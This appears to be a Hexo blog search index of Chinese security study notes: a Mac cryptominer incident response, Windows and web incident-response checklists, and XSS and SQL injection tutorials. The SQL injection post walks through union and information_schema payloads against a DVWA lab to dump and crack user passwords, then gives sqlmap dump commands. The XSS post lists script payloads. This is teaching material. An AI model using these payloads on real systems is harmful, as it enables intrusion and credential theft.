服务7、再用新密码登录即可。 注意：skip-grant-tables参数是会让mysql在登录的时候跳过验证表直接登录到数据库，没特殊情况建议不要将该参数留在数据库配置文件中","tags":[],"categories":[{"name":"数据库","slug":"数据库","permalink":"https://s40d1.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"记一次Mac挖矿病毒的处置","date":"2020-09-16T05:52:48.905Z","path":"wiki/应急响应/记一次Mac挖矿病毒的处置/","text":"前言网络安全圈一年一度的叉叉行动的前期准备过程中，在客户现场进行失陷主机监测和处置。通过态势感知发现某台终端主机有每五分钟向矿池（43.249.204.183:8888）发起一次连接请求的情况，态势报挖矿行为。但是系统运行正常，并无挖矿行为。猜测应该是中了挖矿病毒但不知道什么原因一直连接不上矿池的原因吧。 排查过程拿来机器到手，是台Mac。首先使用其本机上的“趋势大师查杀了一遍”，果然有结果：查了ssl3.plist文件相关的信息，实锤了挖矿病毒程序：寻思着使用趋势大师直接杀掉，但是是我想多了。它只会告诉你有这个文件，但不会告诉你在哪，想直接文件删除？不好意思，收费！故展开一次从进程开始从到至尾的病毒排查和处置。 定位进程和文件首先使用top命令查看电脑的运行状态。未检查到有ssl3.plist、ssl4.plist字样的程序在运行。（此处本应该有图，但是忘记截图拍照了）由于态势报每五分钟一次请求、这里有没有相关进程，推测应该是没五分钟开启一次进程，那么久循环查看占用8888端口的进程：找到进程号5666的进行占用8888端口，根据程进程号来定位程序的文件：找到了文件所在位置，查看文件夹相关内容内容如下：包含了cpu.txt、pools.txt以及ssl3.plist、ssl4.plist等文件。 删除文件结束进程删除病毒相关文件。kill掉进程。（此处本该有图，但是忘记了。）一般情况下，开机启动项里面也应该会被注入相关病毒文件，查看开机启动项文件夹：~/Library/LaunchAgents，果然发现存在ssl3.plist、ssl4.plist字样文件（不好意思，又没图），删除掉相关文件。 继续监测病毒文件被删除了，进程被结束了。然后继续监测8888端口进程，都没有发现相关进程再启动了：于是关机在开机，监测了片刻，哪哪都正常了。 结束物归原主。 复盘关于ssl3.plist、ssl4.plistssl3.plist、ssl4.plist 其实都是 xmr-stak-rx，xmr-stak 是一款集成了 CPU、GPU 挖矿的工具，由最初的 xmr-stak-cpu、xmr-stak-amd 和 xmr-stak-nvidia 三款集成而来，支持 64 位的 Windows、Linux 和 MacOS 系统。后面还出了 xmr-stak-rx，支持 RandomX 算法。 排查中用到的指令 top //查看电脑运行状态lsof -i:port //查看占用port端口的进程ps aux | grep ssl //查找ssl字样的进程 参考文章：https://www.tr0y.wang/2020/03/05/MacOS%E7%9A%84ssl4.plist%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5%E8%AE%B0%E5%BD%95/","tags":[],"categories":[{"name":"应急响应","slug":"应急响应","permalink":"https://s40d1.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}]},{"title":"","date":"2020-09-12T00:00:21.185Z","path":"wiki/渗透/IOT渗透/病毒初级应急响应/","text":"[toc] 常见病毒类型和特点常见分类蠕虫文件夹 飞客蠕虫（conficker）445端口传播，利用MS08-076漏洞发起攻击。中毒症状包括请求解析随机域名（DGA）、不能正常访问安全厂商的网站或服务器、下载木马。详情 文件夹蠕虫（FakeFolder）设置源文件夹隐藏属性，并且自己伪装成文件夹，通过修改注册表系统属性，通常通过共享、U盘传播。 Morto蠕虫通过RDP爆破传播，通过注册表、服务等进行驻留。 NetSky蠕虫获取本地邮箱地址，通过邮件服务器传播包含病毒体的邮件 挖矿病毒Wannamine系列木马感染型病毒（不能做清除，而是做修复）Ramnit感染html文件，插入vbs脚本，会进行客户端vbs脚本传播。详情 宏病毒文档类， 勒索病毒感染文件，勒索赎金，没办法破解 应急工具基础工具Process Hacker procexp &gt; 进程操作，服务操作Autoruns &gt; 计划任务，启动项，服务，WMIEverything &gt; 文件搜索PChunter &gt; 文件，驱动（驱动型工具，可以绕过应用层的防护） 进阶工具Sysmon安装：Sysmon.exe -acceptula -i -n日志路径：%system%\\system32\\winevt\\logs\\microsoft-windows=sysmon%4Operational.evtx卸载：sysmon.exe -u 流行病毒查杀思路勒索时间信息收集是否正在进行加密“徒手杀毒”招式分解观察对象恶意软件商最爱的目录排行快速判断文件“黑白”安全软件报出的文件判断木马类 - Trojan Backdoop如果不是业务程序软件，建议隔离四段式：Trojan.Win32.Wannamine.ufajg其他：TR/Lokibot.gen 借助威胁情报判断文件威胁通过沙箱判断行为其他补充技巧 图标和文件类型是否对应 看似正常系统文件，看MD5 是否具有签名 强壳、混淆 常见应急工具## 分析工具Process Hacker常见病毒处置常见挖矿病毒处置中挖矿木马的计算机，资源会被大量占用，用于数字加密币的挖掘。 挖矿病毒的原理stratum协议是目前最常用的矿机和矿池之间的TCP协议。以下是挖矿的网络结构： 挖矿病毒分析一般挖矿病毒的最明显特征：进程资源占用高50%/25%/100%，可通过判断通信地址为矿池来判断终端可能再进行挖矿。验证挖矿主机常用以下工具： 微步在线 搜索引擎 wireshark、tcpdump等抓包工具 发现挖矿程序，一般会伴随着自启动操作。服务：tasklist /svc、process hacker 1HKEY_LOCAL_MACHINE\\SYSTEM\\Microsoft\\WindowsNT\\CurrentControlSet\\Services 任务计划：taskschd.msc 启动项：VMI：autoruns/wbemtestIPSec：deny445Rookit隐藏：驱动隐藏、attrib -r -s -h、cacls、“file” /g administrator:f","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"IOT渗透","slug":"渗透/IOT渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/"}]},{"title":"Hello World","date":"2020-09-12T00:00:21.185Z","path":"wiki/渗透/IOT渗透/新建文本文档/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"IOT渗透","slug":"渗透/IOT渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/"}]},{"title":"","date":"2020-09-12T00:00:21.183Z","path":"wiki/渗透/IOT渗透/Windows系统监控Sysmon/","text":"[toc] sysmon简介用于监视和记录系统活动，并记录到Windows时间日志，可提供有关进程的创建、网络连接和文件创建时间更改的详细信息。通过集成Windows事件集合或SIEM代理生成的事件，然后分析他们，可识别恶意或异常活动，并了解在网络上是如何的恶意操作。 安装与配置安装命令： 1Sysmon64.exe -acceptula -i z-AlphaVersion.xml 日志分析","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"IOT渗透","slug":"渗透/IOT渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/"}]},{"title":"","date":"2020-09-12T00:00:21.180Z","path":"wiki/渗透/IOT渗透/Windows应急响应排查/","text":"[toc] 一、进程排查独立进程块病毒是独立的可执行文件，以独立进程运行。进程名要么随机，要么相似于系统进程 动态库模块以动态库的方式注入到系统进程和应用程序。 隐藏模块二、网络行为排查重要辅助站点 https://www.virustotal.com/国外知名站点网络连接排查流量分析漏洞与补丁信息三、文件排查临时目录排查 浏览器相关文件排查最近打开文件排查文件时间排查其他重要目录查询system32也是常见的病毒释放目录，需检查hosts文件有没有被篡改。 12C:\\Windows\\System32C:\\Windows\\System32\\drivers\\etc\\hosts 四、远程登录排查Windows日志RDP远程登录排查SMB五、启动方式排查启动项排查任务计划排查服务排查六、账号安全排查compmgmt.msc命令查看计算机上所有用户信息net user 用户名 命令查看指定用户信息 通过PCHunter等工具可以查看隐藏用户，如添加$的隐藏账号，以及克隆账号。","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"IOT渗透","slug":"渗透/IOT渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/"}]},{"title":"","date":"2020-09-12T00:00:21.178Z","path":"wiki/渗透/IOT渗透/web初级应急响应/","text":"[toc] web入侵简介web入侵流程信息收集 &gt; 漏洞扫描 &gt; 渗透攻击 &gt; 提权/挂黑链 &gt; 后渗透攻击 &gt; 持续控制 web入侵方法 通过web脚本或框架的漏洞获取webshell 通过获取cms的后台账号密码并登录 通过数据库开放的端口作为入口，爆破或猜解进入 通过web脚本或框架漏洞获取敏感权限或数据web恶意代码事件 WEBSHELL 黑链广告文件 恶意挂马页面web应用应急响应流程确认攻击类型 &gt; 异常信息收集 &gt; 排查黑链 &gt; 排查webshell &gt; 分析web日志 &gt; 时间总结web应急响应需要处理的问题 发现黑链/暗链跳转等被篡改现象 发现webshell等黑帽SEO-黑链SEO-搜索引擎优化利用搜索引擎的规则提高有关搜索引擎内的自然排名SEO目的搜索结果排名靠前SEO帽子白：遵循规则进行网络推广黑：不遵循规则黑帽SEO-黑链 黑链的排查思路复现黑链存在的现象（搜索引擎复现、多地域访问、终端及服务器端抓包） Webshell查杀Webshellwebshell是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后门，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。 常见工具 名称 平台 下载 D盾 Windows http://www.d99net.net/ 悬镜（慎用） Linux http://www.xmirror.cn/ 360主机卫士 Windows/Linux http://zhuji.360.cn/ webshell.pub Windows/Linux http://www.webshell.pub/ 安全狗 Windows/Linux http://www.safedog.cn/ Sangfor WebshellKiller 3.2 Windows/Linux ### 查杀方法 #### 工具扫描 #### 文件属性（创建时间、修改时间） #### 文件特征（静态特征、动态特征） #### 文件对比 #### 搜索引擎 将代码拖去搜索引擎搜索是否为webshell。 确认webshell之后删除即可 ## Web应急案例讲解 ### ## 日志分析 ### 1.Windows日志分析 2.Web日志分析web日志分类常规日志分析主要关注 1102 &gt; 清理审计日志 4624 &gt; 账号登录成功 4625 &gt; 账号登录失败","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"IOT渗透","slug":"渗透/IOT渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/"}]},{"title":"Hello World","date":"2020-09-11T23:56:29.986Z","path":"wiki/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[],"categories":[]},{"title":"第六节 一文搞懂XSS跨站脚本攻击","date":"2020-07-24T09:35:37.000Z","path":"wiki/渗透/Web渗透/学习笔记/第六节 一文搞懂XSS跨站脚本攻击/","text":"0x00 XSS跨站脚本概要1、什么是XSS跨站脚本漏洞？XSS跨站脚本（Cross-Site Scripting，XSS）自1996年诞生以来，如今已经历十多年的演化。由于和另一种网页技术-层叠样式表（Cascading Style Sheets，CSS）的缩写一样，为了防止混淆，故把原本的CSS简称为XSS。在各种WEB应用安全漏洞中，XSS跨站脚本攻击漏洞一直被OWASP（Open Web Application Security Project）组织评为十大应用安全中的其中之一。【参考OWASP TOP 10：2007年A2 / 2010年A2 / 2013年A3】 XSS最大的特点就是能注入恶意的HTML/JavaScript代码到用户浏览的网页上，是因WEB应用程序对用户输入过滤不足而产生的，当用户浏览这些网页时，就会执行其中的恶意代码。由于HTML代码和客户端JavaScript脚本能在受害者主机上的浏览器任意执行，这样等同于完全控制了WEB客户端的逻辑，在这个基础上，黑客可以轻易地发起Cookie窃取，会话劫持，钓鱼欺骗等各种各样的攻击。 通常情况下，我们既可以把XSS理解成一种WEB应用安全漏洞，也可以理解成一种攻击手段。 2、XSS攻击流程 3、恶意脚本的形式利用XSS弹警告框： 1&lt;script&gt;alert(‘xss’)&lt;/script&gt; 获取cookie值： 1&lt;script&gt;alert(document.cookie)&lt;/script&gt; 嵌入其他网站： 1&lt;iframe src=http://baidu.com width=0 height=0&gt;&lt;/iframe&gt; XSS输入也可能是HTML代码段，如使网页不停刷新： 1&lt;meta http-equiv=\"refresh\" content=\"0;\"&gt; 4、XSS危害检验概括 网络钓鱼，包括盗取各类用户账号 窃取用户cookie资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作 劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账，强制发表日志，发送电子邮件等 强制弹出广告页面，刷流量等 网页挂马 进行恶意操作，例如任意篡改页面信息，删除文章等 进行大量的客户端攻击，如DDOS攻击 获取客户端信息，例如用户的浏览历史，真实ip，开放端口等 控制受害者机器向其他网站发起攻击 结合其他漏洞进一步扩大攻击 提升用户权限，包括进一步渗透网站 传播XSS跨站脚本蠕虫等0x01 XSS跨站脚本分类1、反射型XSS1.1反射型XSS概述反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。例子：1234&lt;?php$username = $_GET['username'];echo $username;?&gt; 在这段代码中，程序接收username值后再输出，如果提交xss1.php?username=test，那么程序将输出test，如果攻击者输入username=alert(‘xss’)，将会造成反射型XSS漏洞。1.2反射型XSS的流程 2、存储型XSS2.1 存储型XSS概述存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本。允许用户存储数据的WEB应用程序都可能会出现存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当再次访问页面时，这段XSS代码被程序读取响应给浏览器，造成XSS跨站攻击，这就是存储型XSS。在测试是否存在XSS时，首先要确定输入点与输出点，例如：我们要在留言内容上测试XSS漏洞，首先就要去寻找留言内容输出（显示）的地方是在标签内还是标签属性内，或者在其他地方，如果输出的数据在属性内，那么XSS是不会被执行的。 2.2存储型XSS攻击流程 DOM型XSS0x02 检测XSS漏洞1、手工检测使用手工检测WEB应用程序是否存在XSS漏洞时，最重要的是考虑哪里有输入、输入的数据在什么地方输出。1.可得知输出的位置输入一些敏感字符，例如”、’、&lt;、&gt;、(、)等，在提交请求后查看HTML源代码，看这些输入的字符是否被转义。2.无法得知输出位置很多WEB应用程序源代码是不对外公开的，这时在测试XSS时就有可能无法得知输入数据到底在哪里显示。比如，测试留言本，留言之后要经过审核才显示，这时候就无法得知输入的数据在后台管理页面是何种状态。通常可以采用””/&gt;XSS来测试。 2、工具检测AppscanAWVSBurpSuite 3、检测思路提交正常数据，使用firebug，chrome的调试等工具跟踪提交数据的标签，如果显示区域不在HTML属性内，则可以直接使用XSS代码注入。如果说不能得知内容输出的具体位置，则可以使用模糊测试。无论存储型XSS，还是反射型XSS。本质问题就是让对方浏览器执行你插入的JavaScript！ 0x03 漏洞利用盗取cookie，登录账号的场景演示假如http://test.com/xss1.php存在XSS反射型跨站漏洞，那么攻击者的步骤可能如下。 test1是网站test.com的用户，此时正在登录的状态中。 攻击者发现http://test.com/xss1.php存在XSS反射型跨站漏洞，然后精心构造JavaScript代码，此段代码可以窃取用户的cookie。 攻击者将带有反射型XSS漏洞的URL通过站内信息发送给用户test1，使用各种诱导的方式让用户test1去打开链接。 如果用户test1打开了带有XSS漏洞的URL，那么就会把自己的cookie发送到攻击者中。 攻击者接受到用户test1的会话cookie，就可以直接利用cookie以test1的身份登录test.com网站中。 以上步骤，通过使用反射型XSS漏洞可以以test1的身份登录网站，这就是其危害。 演示视频传送门0x04 漏洞防御输入与输出中的过滤黑名单与白名单WEB安全编码规范HttpOnly cookie","tags":[{"name":"XSS","slug":"XSS","permalink":"https://s40d1.github.io/tags/XSS/"}],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"学习笔记","slug":"渗透/Web渗透/学习笔记","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"第五节 一篇文章搞懂SQL注入","date":"2020-07-24T03:35:37.000Z","path":"wiki/渗透/Web渗透/学习笔记/第五节 一篇文章搞懂SQL注入/","text":"0X00 数据库相关概念数据（DATA）：图像、语音、文字在计算机系统中，各种字母、数字符号的组合、语音、图形、图像等统称为数据。 数据库(Database)：Access、MSSQL、Oracle、SQLITE、MySQL等数据库是按照数据结构来组织、存储和管理数据的“仓库”。 数据库管理系统(DBMS)：Access、MSSQL、Oracle、SQLITE、MySQL等数据库管理系统(database management system)是一种操纵和管理数据库的软件，用于建立、使用和维护数据库。它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性。 结构化查询语言(SQL)：DQL、DDL、DML、TCL、DCL结构化查询语言(Structured Query Language)简称SQL，结构化查询语言是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统。 数据库常见的操作1、增删改查：insert，update，delete，select查询user表的所有数据 1select * from user; 查询user表“name”等于“admin”的数据； 1select * from user where name&#x3D;&quot;admin&quot;; 往user表里面增加一个用户admin，并且密码为admin@123，电话1318888888 1insert into user values(&quot;admin&quot;,&quot;admin@123&quot;,&quot;13188888888&quot;); 更改admin用户的密码为password 1update user set password&#x3D;&quot;password&quot; where name&#x3D;&quot;admin&quot;; 删除新增admin用户所在的行 1delete from user where name&#x3D;&quot;admin&quot;; 2、SQL order by 语句order by语句通常是用来做排序的，默认按照升序排序。但是在SQL注入中order by主要用来判断当前表是有多少列，然后配合联合查询来爆数据。order by用法：http://10.1.131.10/cms/show.php?id=35利用order by来看当前表有多少列。 123http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 order by 10回显正常http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 order by 15回显正常http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 order by 16回显不正常 以上说明当前表有15列。 3、union联合查询利用联合查询把2个表的数据合在一个表里面 1select * from user union all select * from table2; 如果不想看到前面的查询内容而只想看到后面的内容，可以使前面的查询结果为false： 1select * from user where name&#x3D;1 union all select * from table2; user表里面没有name=1的，所以前面的查询返回false 4、MySql数据库SQL注入中最常见利用的系统数据库，经常利用系统数据库配合union联合查询来获取数据库相关信息，因为系统数据库中所有信息都在这个数据库里面，比如所有数据库名、所有的表名、列名以及列名的数据库类型等，这里主要关注MYSQL系统数据库information_schema，关注系统数据库的表columns和schema表以及tables表： SCHEMATA表：提供了关于数据库的信息COLUMNS表：给出了表中的列信息TABLES表：给出了关于数据库中的表的信息 4.1 COLUMNS表查询数据库名同表schemata一样，查询columns表里面的table_schema列一样可以得到所有数据库名： 1select distinct table_schema from information_schema.columns; 4.2COLUMNS表查询列名查询当前数据库所有列： 1select distinct column_name from information_schema.columns;查询到当前有2232个列名 4.3COLUMNS表查询表名查询当前所有表名： 1select distinct table_name from information_schema.columns;查询结果当前473个表名 4.4TABLES表查询数据库名同表columns以及schemata一样，查询tables表里面的table_schema列一样可以得到所有数据库名： 1select distinct table_schema from information_schema.tables; 4.5TABLES表查询表名同columns表一样，从tables表里面的所有表名： 1select distinct table_name from information_schema.tables; 4.6MySQL函数SQL函数是在SQL注入中用的比较多的，经常利用SQL函数来判断数据库的版本，当前用户，当前用户权限以及数据库的安装路径等等，以下是常用的MYSQL函数： 12345678910system_user()系统用户名user()用户名current_user() 当前用户名session_user() 连接数据库用的用户名database() 数据库名version() mysql数据库版本load_file() mysql读取本地文件的函数@@datadir 数据库路径@@basedir mysql安装路径@@version_compile_os 操作系统 0X01SQL注入相关概念1、静态页面html或者htm，是一种静态的页面格式，不需要服务器解析其中的脚本。由浏览器如(IE、Chrome等)解析。 1.不依赖数据库2.灵活性差，制作、更新、维护麻烦3.交互性交差，在功能方面有较大的限制4.安全，不存在SQL注入漏洞 2、动态页面asp、aspx、php、jsp等，由相应的脚本引擎来解释执行，根据指令生成静态网页。 1.依赖数据库2.灵活性好，维护简便3.交互性好，功能强大4.存在安全风险，可能存在SQL注入漏洞，这里要纠正一点，不是会动的或者有动态GIF图片就是动态网站，一定要是有上门所述的脚本语言构成的网站，如下图所示是一个php脚本搭建的动态网站 3、WEB应用工作原理 4、SQL注入定义SQL Injection：就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句本质：代码数据不区分。成因：未对用户提交的参数数据进行校验或有效的过滤，直接进行SQL语句拼接，改变了原有SQL语句的语义，传入数据库解析引擎中执行。结果：SQL注入。 5、SQL注入触发所有的输入只要和数据库进行交互的，都有可能触发SQL注入常见的包括：Get参数触发SQL注入POST参数触发SQL注入Cookie触发SQL注入其他参与sql执行的输入都有可能进行SQL注入 6、SQL注入过程 7、SQL注入场景一切用户可控参数的地方，比如：URL路径、GET/POST请求参数、HTTP请求头 8、SQL注入的作用 绕过登录验证：使用万能密码登录网站后台等 获取敏感数据：获取网站管理员帐号、密码等 文件系统操作：列目录，读取、写入文件等 注册表操作：读取、写入、删除注册表等 执行系统命令：远程执行命令 0X02 注入漏洞分类1、数字型注入http://www.test.com/test.php?id=1猜测SQL语句为：select * from table where id=1测试： 1http:&#x2F;&#x2F;www.test.com&#x2F;test.php?id&#x3D;1’ SQL语句为：select * from table where id=1’ ，页面出现异常 1http:&#x2F;&#x2F;www.test.com&#x2F;test.php?id&#x3D;1 and 1&#x3D;1 SQL语句为：select * from table where id=1 and 1=1 ，页面正常 1http:&#x2F;&#x2F;www.test.com&#x2F;test.php?id&#x3D;1 and 1&#x3D;2 SQL语句为：select * from table where id=1 and 1=2，返回数据与原始请求不同注：当输入的参数为整型时，如：ID，年龄，页码等，如果存在注入漏洞，则可以认为是数字型注入。 2、字符型注入数字型：select * from table where id =1字符型：select * from table where username=‘test’字符型注入最关键的是如何闭合SQL语句以及注释多余的代码查询内容为字符串时：select * from table where username = ‘test’测试： 1select * from table where username &#x3D; &#39;test and 1&#x3D;1&#39; 无法注入，“test and 1=1”会被数据库当作查询的字符串 1select * from table where username &#x3D; &#39;test&#39; and &#39;1&#39;&#x3D;&#39;1&#39; --&#39; 必须闭合字符串才可以继续注入 数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合 3、数据库注释的语法 4、测试语句 5、SQL注入分类细化5.1按照数据类型： 数字形（Integer） 字符型（String）5.2按返回结果： 显错注入（Error-Based） 盲注（Boolean/Time-Based Blind）5.3其他分类 POST注入：注入字段在POST数据中 Cookie注入：注入字段在Cookie数据中 搜索注入：注入处为搜索的点 Baes64注入：注入字符串需要经过base64加密 布尔型盲注：即可以根据返回页面判断条件真假的注入 时间延迟型盲注：即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断 报错回显型注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中 联合查询型注入：可以使用union的情况下的注入 堆查询型注入：可以同时执行多条语句的执行时的注入6、演示：以DVWA的字符型注入为例6.1判断是否存在注入执行1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit# 结果如下: 再执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;&amp;Submit&#x3D;Submit# 结果如下: 表明参数类型为字符型。再执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;and&#39;1&#39;&#x3D;&#39;1&amp;Submit&#x3D;Submit# 结果如下: 产生的结果与id=1的内容相同。接着执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;and&#39;1&#39;&#x3D;&#39;2&amp;Submit&#x3D;Submit# 不显示任何内容。 表明此处可能存在有注入漏洞。 6.2利用order by判断该数据表的字段数量执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;order by 5%23&amp;Submit&#x3D;Submit# 结果如下： 通过更换order by后面的数字，直到能够返回正常的最大值：2 由此可得到该数据表的字段数为2。 6.3用union查询标记可以执行SQL的位置执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select 1,2%23&amp;Submit&#x3D;Submit# 结果如下是：表明在1,2处可以执行SQL语句。 6.4用datebase（）函数在1处查询当前数据库名执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select database(),2%23&amp;Submit&#x3D;Submit# 结果为： 6.5查询dvwa数据库的表执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select table_name from information_schema.tables where table_schema &#x3D; &#39;dvwa&#39; limit0,1),2%23&amp;Submit&#x3D;Submit# 结果如下： 得到了dvwa的第一个表guestbook，以同样的方式改变limit的参数为limit1,1可获得第二个表users。如下图： 比较两个表名，推测用户名可能在users表中，故先查询users中的字段。 6.6查询users表中的字段执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select column_name from information_schema.columns where table_schema &#x3D; &#39;dvwa&#39; and table_name &#x3D; &#39;users&#39; limit 0,1),2%23&amp;Submit&#x3D;Submit# 结果如下： 得出来users表的的第一个字段为user_id，同理可得第二个为 first_name，第三个为last_name，第四个为user，第五个为password，第六个为avatar，······ 6.7获取user字段的第二个数据和password字段的第二个数据执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select user from dvwa.users limit 1,1),2%23&amp;Submit&#x3D;Submit# 获得user字段的第二个数据为： 执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select password from dvwa.users limit 1,1),2%23&amp;Submit&#x3D;Submit# 获得password字段的第二个数据 MD5解密密码得： 尝试登陆： 登陆成功！ 0X03 SQL注入的利用工具：sqlmapsqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。采用五种独特的SQL注入技术，分别是： 1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 4）联合查询注入，可以使用union的情况下的注入。 5）堆查询注入，可以同时执行多条语句的执行时的注入。sqlmap常用命令 1sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 --dbs -u 指定检测的URL地址 –dbs列出数据库 1sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 -D cms --tables 获取指定数据库cms的表名 1sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 -D cms -T cms_users --columns 获取指定数据库cms及指定表cms_users的列名 1sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 -D cms -T cms_users -C username,password --dump dump列username和password的值 -r c:\\sqltest.txt 加载请求数据–cookie=COOKIE 登录后的cookie–proxy=”http://127.0.0.1:8080&quot; 使用HTTP代理 0X04防御SQL注入SQL注入的危害这些危害包括但不局限于： 数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。 网页篡改：通过操作数据库对特定网页进行篡改。 网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。 服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。 破坏硬盘数据，瘫痪全系统。 一些类型的数据库系统能够让SQL指令操作文件系统，这使得SQL注入的危害被进一步放大。 防御手段：过滤用户输入过滤对象 用户的输入 提交的URL请求中的参数部分 从cookie中得到的数据 部署防SQL注入系统或脚本过滤类容单引号、双引号、斜杠、反斜杠、冒号、空字符等的字符，如图PHP中利用str_replace方法把特殊字符替换成空格，如下：1234567891011121314151617181920212223function 